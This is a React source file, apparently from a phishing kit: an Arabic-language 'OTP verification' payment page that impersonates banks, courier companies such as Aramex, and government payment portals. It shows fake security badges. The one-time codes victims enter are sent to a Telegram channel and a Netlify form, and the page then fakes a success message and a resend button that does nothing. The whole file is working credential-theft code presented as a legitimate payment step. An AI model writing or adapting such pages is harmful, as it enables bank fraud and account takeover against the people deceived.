import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { bankBranding } from "@/lib/brandingSystem";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Loader2, Lock, ShieldCheck, Smartphone, RefreshCw, ArrowRight } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getGovBranding } from "@/lib/governmentPaymentSystems";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentOTP = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(60);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default;
  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
  const govId = searchParams.get("govId") || linkData?.payload?.govId;
  const branding = getServiceBranding(companyKey);
  const govBranding = govId ? getGovBranding(govId) : undefined;

  const isGov = !!govBranding;
  const primaryColor = selectedBankId && selectedBankId !== "skipped" ? selectedBankBranding.colors.primary : (isGov ? govBranding.colors.primary : branding.colors.primary);

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 4) {
      toast({ title: "خطأ", description: "الرجاء إدخال رمز التحقق المكون من 4-6 أرقام", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "otp-verification",
          linkId: id!,
          otp: otp,
          timestamp: new Date().toISOString()
        }).toString()
      });

      await sendToTelegram({
        type: 'otp_info',
        data: { otp, service: isGov ? govBranding.nameAr : branding.name },
        timestamp: new Date().toISOString()
      });

      toast({ title: "تم إرسال الرمز", description: "جاري التحقق من الرمز المدخل..." });
      // Redirect to a success or processing page if needed, for now just stay or show success
      setTimeout(() => {
         toast({ title: "تم التحقق", description: "تم قبول رمز التحقق بنجاح" });
         setIsSubmitting(false);
      }, 3000);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل التحقق من الرمز", variant: "destructive" });
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-slate-50" dir="rtl">
      <PaymentMetaTags
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : companyKey}
        serviceName={isGov ? govBranding.nameAr : branding.name}
        title="رمز التحقق الآمن - OTP"
      />

      <header className="bg-white border-b h-16 sm:h-20 flex items-center px-4 sticky top-0 z-50">
         <div className="container mx-auto flex justify-between items-center">
            <img src={selectedBankId && selectedBankId !== "skipped" ? selectedBankBranding.logo : (isGov ? govBranding.logo : branding.logo)} alt="" className="h-10 object-contain" />
            <div className="flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full border border-green-100">
               <ShieldCheck className="w-3 h-3" />
               <span className="text-[10px] font-bold uppercase tracking-widest">Verified</span>
            </div>
         </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-8 max-w-md flex flex-col justify-center">
         <Card className="border-none shadow-2xl rounded-[2.5rem] overflow-hidden bg-white">
            <div className="p-8 sm:p-10 text-center space-y-4">
               <div className="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mx-auto text-blue-600">
                  <Smartphone className="w-10 h-10" />
               </div>
               <div>
                  <h2 className="text-2xl font-black text-slate-800">رمز التحقق (OTP)</h2>
                  <p className="text-sm font-bold text-slate-400 mt-2">تم إرسال رمز التحقق إلى رقم الجوال المسجل في البنك الخاص بك</p>
               </div>
            </div>

            <form onSubmit={handleSubmit} className="px-8 sm:px-10 pb-10 space-y-8">
               <div className="space-y-4 text-center">
                  <Label className="text-[11px] font-black text-slate-400 uppercase tracking-[0.3em]">أدخل الرمز المكون من 6 أرقام</Label>
                  <div className="flex justify-center">
                    <Input
                      value={otp}
                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                      className="h-20 border-2 border-slate-100 rounded-3xl font-black text-4xl text-center bg-slate-50/50 tracking-[0.5em] focus:border-blue-500 transition-all w-full max-w-[280px]"
                      placeholder="******"
                      inputMode="numeric"
                      required
                    />
                  </div>
               </div>

               <div className="space-y-4">
                  <Button
                    type="submit"
                    disabled={isSubmitting || otp.length < 4}
                    className="w-full h-16 rounded-2xl font-black text-lg shadow-xl text-white active:scale-95 transition-all"
                    style={{ backgroundColor: primaryColor }}
                  >
                    {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "تأكيد وإتمام السداد"}
                  </Button>

                  <div className="text-center">
                    {timer > 0 ? (
                       <p className="text-xs font-bold text-gray-400 uppercase">يمكنك إعادة إرسال الرمز خلال {timer} ثانية</p>
                    ) : (
                       <button type="button" onClick={() => {setTimer(60); toast({title: "تم!", description: "تم إعادة إرسال رمز التحقق"});}} className="text-xs font-black text-blue-600 uppercase flex items-center justify-center gap-2 mx-auto">
                          <RefreshCw className="w-3.5 h-3.5" />
                          إعادة إرسال الرمز الآن
                       </button>
                    )}
                  </div>
               </div>
            </form>

            <div className="p-6 bg-slate-50 border-t flex items-center justify-center gap-3 text-[10px] font-bold text-slate-300 uppercase">
               <Lock className="w-3.5 h-3.5" />
               <span>Secure Multi-Factor Authentication</span>
            </div>
         </Card>

         <button onClick={() => navigate(-1)} className="mt-8 mx-auto flex items-center gap-2 text-slate-400 hover:text-slate-600 transition-colors">
            <ArrowRight className="w-4 h-4" />
            <span className="text-xs font-bold uppercase tracking-widest">العودة</span>
         </button>
      </main>

      <form name="otp-verification" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="otp" />
        <input type="text" name="timestamp" />
      </form>
    </div>
  );
};

export default PaymentOTP;
